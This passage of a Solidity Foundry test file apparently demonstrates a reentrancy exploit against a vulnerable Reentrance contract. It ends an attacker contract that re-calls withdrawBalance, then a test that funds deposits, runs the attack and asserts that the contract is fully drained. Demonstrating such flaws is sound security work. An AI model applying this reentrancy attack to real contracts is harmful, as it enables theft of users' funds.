            target.withdrawBalance();
        }
    }
}

contract ReentranceTest is Test {
    Reentrance public reentrance;
    address public testUser = address(0x123);
    ReentranceAttacker public attacker;

    function setUp() public {
        reentrance = new Reentrance();
        attacker = new ReentranceAttacker(reentrance);

        // Setup test user deposit (1 ether)
        vm.deal(testUser, 1 ether);
        vm.prank(testUser);
        reentrance.addToBalance{value: 1 ether}();

        // Setup attacker deposit (1 ether)
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        reentrance.addToBalance{value: 1 ether}();
    }

    function testReentrancyVulnerability() public {
        // Record initial balances
        uint initialContractBalance = address(reentrance).balance;
        uint initialAttackerBalance = address(attacker).balance;

        // Execute attack
        attacker.attack();

        // Record final balances
        uint finalContractBalance = address(reentrance).balance;
        uint finalAttackerBalance = address(attacker).balance;

        // Verify attack success
        assertEq(initialContractBalance, 2 ether, "Initial contract balance incorrect");
        assertEq(finalContractBalance, 0, "Contract not drained");
        assertEq(finalAttackerBalance - initialAttackerBalance, 2 ether, "Attacker profits incorrect");
